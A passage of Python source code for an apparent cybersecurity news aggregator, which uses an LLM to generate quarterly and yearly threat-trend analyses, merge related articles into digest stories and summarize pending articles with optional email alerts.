            temperature=0.3,
            max_tokens=1500,
            json_mode=True,
        )
        cost_tracker.add_tokens(it, ot, cc, cr)
        data = json.loads(content)
        return data.get("trend")
    except Exception as e:
        logger.error(f"Batch summarization failed: {e}")
        return None


def _build_article_summaries(articles, category_name):
    """Build a summary text block from articles. Batches large quarters via thread pool."""
    def fmt(art):
        date_str = art.get("published_date") or "unknown date"
        return f"- **{art['title']}** ({date_str}): {_extract_trend_summary(art)}"

    if len(articles) <= _TREND_BATCH_SIZE:
        return "\n".join(fmt(a) for a in articles)

    batches = [articles[i:i + _TREND_BATCH_SIZE] for i in range(0, len(articles), _TREND_BATCH_SIZE)]
    batch_texts = ["\n".join(fmt(a) for a in b) for b in batches]
    results = [None] * len(batches)

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(_summarize_batch, category_name, bt): idx
            for idx, bt in enumerate(batch_texts)
        }
        for future in as_completed(futures):
            idx = futures[future]
            results[idx] = future.result() or f"Batch {idx + 1}: {len(batches[idx])} articles (summary unavailable)"

    return "\n\n---\n\n".join(r for r in results if r)


def _generate_quarterly_trend(category_name, quarter_label, article_count, summary_text, prev_trend):
    """Call LLM for a single quarter's trend. Returns formatted markdown or None."""
    if prev_trend:
        prompt = (QUARTERLY_TREND_SUBSEQUENT_PROMPT
                  .replace("{category}", category_name)
                  .replace("{period}", quarter_label)
                  .replace("{count}", str(article_count))
                  .replace("{prev_trend}", prev_trend[:3000]))
    else:
        prompt = (QUARTERLY_TREND_FIRST_PROMPT
                  .replace("{category}", category_name)
                  .replace("{period}", quarter_label)
                  .replace("{count}", str(article_count)))
    try:
        content, it, ot, cc, cr = call_llm(
            prompt,
            [{"role": "user", "content": f"Category: {category_name}\nPeriod: {quarter_label}\nArticle count: {article_count}\n\n{summary_text}"}],
            temperature=0.4,
            max_tokens=2500,
            json_mode=True,
        )
        cost_tracker.add_tokens(it, ot, cc, cr)
        return _format_trend_result(json.loads(content))
    except Exception as e:
        logger.error(f"Quarterly trend generation failed for {quarter_label}: {e}")
        return None


def _generate_yearly_trend(category_name, year, quarterly_trends, prev_year_trend):
    """Call LLM to synthesize quarterly trends into a yearly report. Returns markdown or None."""
    quarterly_summaries = "\n\n".join(
        f"### {qt['period']} ({qt['article_count']} articles)\n{qt['trend_text']}"
        for qt in quarterly_trends
    )
    if prev_year_trend:
        prompt = (YEARLY_TREND_SUBSEQUENT_PROMPT
                  .replace("{category}", category_name)
                  .replace("{year}", str(year))
                  .replace("{quarterly_summaries}", quarterly_summaries[:8000])
                  .replace("{prev_trend}", prev_year_trend[:3000]))
    else:
        prompt = (YEARLY_TREND_FIRST_PROMPT
                  .replace("{category}", category_name)
                  .replace("{year}", str(year))
                  .replace("{quarterly_summaries}", quarterly_summaries[:8000]))
    try:
        content, it, ot, cc, cr = call_llm(
            prompt,
            [{"role": "user", "content": f"Category: {category_name}\nYear: {year}\nQuarters covered: {len(quarterly_trends)}"}],
            temperature=0.4,
            max_tokens=3000,
            json_mode=True,
        )
        cost_tracker.add_tokens(it, ot, cc, cr)
        return _format_trend_result(json.loads(content))
    except Exception as e:
        logger.error(f"Yearly trend generation failed for {year}: {e}")
        return None


def generate_trend_analysis(category_name, subcategory_tag=None, since_days=None):
    """Generate quarterly and yearly historical trend analyses for a category.

    Groups summarized articles by quarter, generates per-quarter LLM analyses
    sequentially (each referencing the previous quarter), then synthesizes each
    year's quarters into a yearly report. Results are cached in ``trend_analyses``
    and only regenerated when the article hash changes.

    When ``since_days`` is provided, the cache is bypassed entirely (neither
    read nor written) to avoid overwriting the full-dataset cache with a
    time-filtered subset.

    Args:
        category_name: Broad category name (e.g. ``"Malware"``).
        subcategory_tag: Optional entity tag to narrow the focus.
        since_days: If set, only include articles from the last N days
            and skip the persistent cache.

    Returns:
        A dict with keys:
            - ``quarterly``: list of ``{period, article_count, trend_text}``
            - ``yearly``: list of ``{period, article_count, trend_text}``
            - ``model_used``: model name string
        Returns ``None`` if API key is missing or fewer than 3 articles exist.
    """
    from database import get_articles_for_category, get_trend_analysis, save_trend_analysis

    if not has_api_key():
        return None

    skip_cache = since_days is not None
    articles = get_articles_for_category(category_name, subcategory_tag=subcategory_tag, since_days=since_days)
    if len(articles) < 3:
        return None

    quarter_groups = _group_by_quarter(articles)
    if not quarter_groups:
        return None

    logger.info(f"Trend analysis: {len(articles)} articles across {len(quarter_groups)} quarters for {category_name}")

    # --- Quarterly pass (sequential so each can reference previous) ---
    quarterly_results = []
    prev_trend_text = None

    for (year, quarter), q_articles in quarter_groups.items():
        period_label = f"{year}-Q{quarter}"
        q_hash = _compute_trend_hash(q_articles)

        if not skip_cache:
            cached = get_trend_analysis(category_name, "quarterly", period_label)
            if cached and cached.get("article_hash") == q_hash:
                logger.info(f"  Using cached quarterly trend for {period_label}")
                entry = {"period": period_label, "article_count": cached["article_count"], "trend_text": cached["trend_text"]}
                quarterly_results.append(entry)
                prev_trend_text = cached["trend_text"]
                continue

        logger.info(f"  Generating quarterly trend for {period_label} ({len(q_articles)} articles)...")
        summary_text = _build_article_summaries(q_articles, category_name)
        trend_text = _generate_quarterly_trend(
            category_name, period_label, len(q_articles), summary_text, prev_trend_text
        )
        model = get_model_name()
        if trend_text:
            if not skip_cache:
                save_trend_analysis(category_name, "quarterly", period_label, trend_text, len(q_articles), q_hash, model)
            entry = {"period": period_label, "article_count": len(q_articles), "trend_text": trend_text}
            quarterly_results.append(entry)
            prev_trend_text = trend_text

    # --- Yearly pass ---
    yearly_results = []
    years = sorted({year for (year, _) in quarter_groups})
    prev_year_text = None

    for year in years:
        year_quarters = [q for q in quarterly_results if q["period"].startswith(f"{year}-")]
        if not year_quarters:
            continue

        year_total = sum(q["article_count"] for q in year_quarters)

        if not skip_cache:
            year_hash = ":".join(
                get_trend_analysis(category_name, "quarterly", q["period"])["article_hash"]
                for q in year_quarters
                if get_trend_analysis(category_name, "quarterly", q["period"])
            )
            cached = get_trend_analysis(category_name, "yearly", str(year))
            if cached and cached.get("article_hash") == year_hash:
                logger.info(f"  Using cached yearly trend for {year}")
                entry = {"period": str(year), "article_count": cached["article_count"], "trend_text": cached["trend_text"]}
                yearly_results.append(entry)
                prev_year_text = cached["trend_text"]
                continue

        logger.info(f"  Generating yearly trend for {year}...")
        trend_text = _generate_yearly_trend(category_name, year, year_quarters, prev_year_text)
        model = get_model_name()
        if trend_text:
            if not skip_cache:
                year_hash_save = ":".join(
                    get_trend_analysis(category_name, "quarterly", q["period"])["article_hash"]
                    for q in year_quarters
                    if get_trend_analysis(category_name, "quarterly", q["period"])
                )
                save_trend_analysis(category_name, "yearly", str(year), trend_text, year_total, year_hash_save, model)
            entry = {"period": str(year), "article_count": year_total, "trend_text": trend_text}
            yearly_results.append(entry)
            prev_year_text = trend_text

    return {
        "quarterly": quarterly_results,
        "yearly": yearly_results,
        "model_used": get_model_name(),
    }


DIGEST_STORY_PROMPT = """You are a senior cybersecurity threat intelligence analyst.
You have been given multiple news articles from different sources that cover the same security story.
Synthesize them into a unified story entry for a daily digest email.

Produce a JSON object with exactly four keys:
- "story_title": A concise, specific headline (max 15 words) that captures the core security event.
- "executive_summary": A paragraph that weaves together what each source reported, using the pattern
  "Source X reported that ... Source Y noted that ...". Mention each source by name.
- "details": A JSON array of strings. Each string is one detailed bullet synthesizing technical
  findings across sources. Use "Source X said ..." attribution where sources differ. Be thorough.
- "mitigations": A JSON array of strings. Each string is one mitigation or defensive recommendation,
  attributed to the source that mentioned it (e.g., "Source X recommended ...").

Article sources to synthesize:
{articles_block}

Respond ONLY with valid JSON."""


def synthesize_digest_story(cluster_articles):
    """Synthesize a cluster of related articles into a single digest story via LLM.

    Args:
        cluster_articles: List of article dicts with keys ``title``, ``url``,
            ``source_name``, and ``summary_text``.

    Returns:
        A dict with keys ``story_title``, ``executive_summary``, ``details``
        (list), ``mitigations`` (list), and ``source_urls`` (list).
        Returns a template-assembled fallback dict on LLM failure.
    """
    import re as _re

    source_urls = [a.get("url", "") for a in cluster_articles]

    # Build the articles block for the prompt
    blocks = []
    for art in cluster_articles:
        summary = art.get("summary_text") or ""
        # Extract executive summary section
        match = _re.search(r"# Executive Summary\s*\n([\s\S]*?)(?=\n#|\Z)", summary, _re.IGNORECASE)
        exec_sum = match.group(1).strip() if match else summary[:500]
        # Extract details
        d_match = _re.search(r"# Details\s*\n([\s\S]*?)(?=\n#|\Z)", summary, _re.IGNORECASE)
        details_raw = d_match.group(1).strip() if d_match else ""
        # Extract mitigations
        m_match = _re.search(r"# Mitigations\s*\n([\s\S]*?)(?=\n#|\Z)", summary, _re.IGNORECASE)
        mit_raw = m_match.group(1).strip() if m_match else ""
        blocks.append(
            f"Source: {art.get('source_name', 'Unknown')}\n"
            f"Title: {art.get('title', '')}\n"
            f"Executive Summary: {exec_sum}\n"
            f"Details: {details_raw[:600]}\n"
            f"Mitigations: {mit_raw[:400]}"
        )

    articles_block = "\n\n---\n\n".join(blocks)
    prompt = DIGEST_STORY_PROMPT.replace("{articles_block}", articles_block[:15000])

    for attempt in range(3):
        try:
            content_str, it, ot, cc, cr = call_llm(
                prompt,
                [{"role": "user", "content": f"Synthesize these {len(cluster_articles)} articles into one digest story."}],
                temperature=0.3,
                max_tokens=2000,
                json_mode=True,
            )
            cost_tracker.add_tokens(it, ot, cc, cr)
            result = json.loads(content_str)
            return {
                "story_title": result.get("story_title", cluster_articles[0].get("title", "Security Story")),
                "executive_summary": result.get("executive_summary", ""),
                "details": result.get("details", []),
                "mitigations": result.get("mitigations", []),
                "source_urls": source_urls,
            }
        except Exception as e:
            if _is_rate_limit_error(e):
                wait = 2 ** (attempt + 1)
                logger.warning(f"Rate limited during digest synthesis, waiting {wait}s")
                time.sleep(wait)
            elif attempt < 2:
                logger.error(f"Digest story synthesis error (attempt {attempt + 1}): {e}")
                time.sleep(1)
            else:
                logger.error(f"All digest synthesis retries failed: {e}")

    # Fallback: template-assembled from first article
    first = cluster_articles[0]
    return {
        "story_title": first.get("title", "Security Story"),
        "executive_summary": " ".join(
            f"{a.get('source_name', 'A source')} reported on this story." for a in cluster_articles
        ),
        "details": [f"{a.get('source_name', 'Source')}: {(a.get('summary_text') or '')[:200]}" for a in cluster_articles],
        "mitigations": [],
        "source_urls": source_urls,
    }


def summarize_pending(limit=10, article_ids=None):
    """Process a batch of unsummarized articles that have scraped content.

    Fetches up to ``limit`` articles with ``content_raw`` but no summary,
    generates a structured summary for each, and saves results to the
    database. Failed summaries are marked with ``model_used='failed'``
    to prevent indefinite retries.

    Args:
        limit: Maximum number of articles to summarize in this batch.
        article_ids: Optional list of article IDs to restrict processing to.

    Returns:
        Total number of articles processed (successful + failed).
    """
    if not has_api_key():
        logger.info("No LLM API key configured, skipping summarization")
        return 0

    articles = get_unsummarized_articles(limit=limit, article_ids=article_ids)
    summarized = 0

    for article in articles:
        title = article["title"]
        content = article["content_raw"]
        article_id = article["id"]
        article_url = article.get("url", "")

        logger.info(f"Summarizing article {article_id}: {title[:60]}")
        result = summarize_article(title, content)

        if result:
            attack_flow = result.get("attack_flow", [])
            # novelty_notes / network_traffic_reason are no longer produced (Android-aligned
            # schema); pass None so legacy DB columns stay intact but unused for new rows.
            save_summary(
                article_id=article_id,
                summary_text=result["summary"],
                key_points=json.dumps(attack_flow) if attack_flow else None,
                tags=json.dumps(result["tags"]),
                novelty_notes=None,
                model_used=get_model_name(),
                network_traffic_reason=None,
            )
            summarized += 1
            logger.info(f"  Summarized article {article_id}")

            try:
                email_mode = load_config().get("email_mode", "per_article")
                if email_mode == "per_article":
                    from notifier import send_article_notification
                    send_article_notification(title, article_url, result.get("raw_data", {}))
            except Exception as e:
                logger.debug(f"  Notification skipped for article {article_id}: {e}")
        else:
            # Save a failed marker so this article isn't retried forever
            save_summary(
                article_id=article_id,
                summary_text="",
                key_points=None,
                tags="[]",
                novelty_notes=None,
                model_used="failed",
            )
            logger.warning(f"  Failed to summarize article {article_id}")

    logger.info(f"Summarized {summarized}/{len(articles)} articles")
    return len(articles)
